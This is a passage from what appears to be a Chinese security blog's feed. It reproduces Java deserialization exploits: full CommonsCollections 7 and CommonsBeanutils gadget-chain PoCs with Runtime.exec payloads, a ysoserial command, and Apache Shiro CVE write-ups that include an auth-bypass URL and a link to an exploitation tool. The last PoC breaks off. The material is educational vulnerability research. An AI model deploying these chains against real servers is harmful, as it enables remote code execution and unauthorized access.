class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap,<span class="hljs-string">&quot;aa&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bb&quot;</span>);<br>        Lazymap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br>        Class c=LazyMap.class;<br>        Field factoryfield=c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(Lazymap,chainedTransformer);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commonscollections-7"><a class="markdownIt-Anchor" href="#commonscollections-7"></a> CommonsCollections 7</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections7 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashtable</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashtable</span>.reconstitutionPut-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractMapDecorator</span>.equals-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractMap</span>.equals-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">//这里的键值对不能改，需要满足hash碰撞</span><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br>        SetFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,Transformers);<br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br>        String s=serialize(hashtable);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805">白日梦组长CommonsCollections反序列化</a></p><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">commons collection简介</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro反序列化</title>
    <link href="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>对shiro反序列化做一个复现</p><h2 id="cve-2016-4437shiro-550"><a class="markdownIt-Anchor" href="#cve-2016-4437shiro-550"></a> CVE-2016-4437(Shiro-550)</h2><h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3><p>Apache Shiro&lt;=1.2.4</p><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3><p>Apacha shiro 提供了remember的功能，当用户登录并选择remember时下次登录就是通过cookie进行认证。</p><p>shiro的认证机制是将接收到的cookie 进行base64解码，然后通过AES解码，最后进行反序列化。</p><p>而在Apache Shiro&lt;=1.2.4，AES的加解密密钥是<strong>硬编码</strong>在代码中，如果攻击者通过泄露或者爆破得到密钥，则可以伪造Remember的值。也就是先构造能够触发命令执行的序列化，然后AES加密，base64编码得到remember，然后以remember=这个值去访问服务端就会触发反序列化漏洞。</p><p>比如打CC链，需要有引入CommonsCollections组件</p><h2 id="cve-2019-12422shiro-721"><a class="markdownIt-Anchor" href="#cve-2019-12422shiro-721"></a> CVE-2019-12422(Shiro-721)</h2><h3 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> 影响版本</h3><p>1.2.5,<br />1.2.6,<br />1.3.0,<br />1.3.1,<br />1.3.2,<br />1.4.0-RC2,<br />1.4.0,<br />1.4.1</p><h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h3><p>相较于Shiro-550，Shiro-721的AES加密是AES-CBC，key是系统动态生成的，所以是猜不到的。</p><p>Padding Oracle Attack攻击可以实现破解AES-CBC加密过程进而实现rememberMe的内容伪造。（<strong>需要提供一个正常用户Cookie中的remember值</strong>）</p><p>上面两个CVE的利用工具</p><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/">GitHub - feihong-cs/ShiroExploit-Deprecated: Shiro550/Shiro721 一键化利用工具，支持多种回显方式</a></p><h2 id="cve-2020-1957"><a class="markdownIt-Anchor" href="#cve-2020-1957"></a> CVE-2020-1957</h2><h3 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h3><p>Apache Shiro &lt; 1.5.1</p><h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h3><p>这个是一个鉴权漏洞。</p><p>Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p><h3 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h3><p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p><h2 id="commons-collectionscommon-beanutils链利用"><a class="markdownIt-Anchor" href="#commons-collectionscommon-beanutils链利用"></a> commons-collections+common-beanutils链利用</h2><p>利用链</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:readObject-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:heapify-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDown-&gt;PriorityQueue</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:siftDownUsingComparator-&gt;BeanComparator</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:compare-&gt;PropertyUtils</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getProperty-&gt;PropertyUtilsBean</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:-&gt;getSimpleProperty-&gt;TemplatesImpl</span>链<br></code></pre></td></tr></table></figure><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" class=""><p>无参实例化时，会使用<code>this()</code> 关键字用于调用当前类的另一个构造函数，所以会调用<code>BeanComparator(String property)</code></p><p><code>BeanComparator(String property)</code>中使用了<code>ComparableComparator</code>。使用<code>ComparableComparator</code>需要引入<code>commons-collections</code>。</p><p>在<code>BeanComparator::compare</code>,</p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" class=""><p>调用了<code>PropertyUtils.getProperty</code>参数可控，</p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" class=""><p>调用了<code>PropertyUtilsBean.getProperty</code>，然后调用<code>getNestedProperty</code>，再调用<code>getSimpleProperty</code></p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class=""><p>可以设置要调用的getter方法，这里设置为调用<code>TemplatesImpl</code>的<code>getOutputProperties</code></p><h3 id="poc-2"><a class="markdownIt-Anchor" href="#poc-2"></a> POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> field.get(obj);<br>        <span class="hljs-keyword">return</span> value;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//恶意Templates</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Calc&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>); <span class="hljs-comment">//要调用的getter</span><br>        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CommonsBeanutils.ser&quot;</span>));<br>        inputStream.readObject();<br>        inputStream.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="commonsbeanutils链利用"><a class="markdownIt-Anchor" href="#commonsbeanutils链利用"></a> CommonsBeanutils链利用</h2><p>CB链不需要依赖其他组件，shiro自身带了CommonsBeanutils组件，自身就可以完成利用。</p><h3 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h3><p>由于<code>ComparableComparator</code>是<code>commons-collections</code>中的，所以要不想依赖CC就不能用到<code>commons-collections</code></p><p>在<code>BeanComparator</code>的构造函数中，可以通过传递两个参数（String,Comparator）来避免使用<code>commons-collections</code></p><img src="/2024/09/05/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" class=""><p>p神已经找到了可以传的<code>Comparator</code>:<code>String.CASE_INSENSITIVE_ORDER</code>，所以构造时用</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">BeanComparator beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-type">BeanComparator</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">String</span>.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><p>而<code>PriorityQueue::add</code>当添加第二个时会调用到<code>String.CASE_INSENSITIVE_ORDER</code>的<code>compare</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">String</span> s1, <span class="hljs-type">String</span> s2)</span> </span><br></code></pre></td></tr></table></figure><p>参数要求是String，所以add的时候要改成String类型。</p><h3 id="poc-3"><a class="markdownIt-Anchor" href="#poc-3"></a> POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 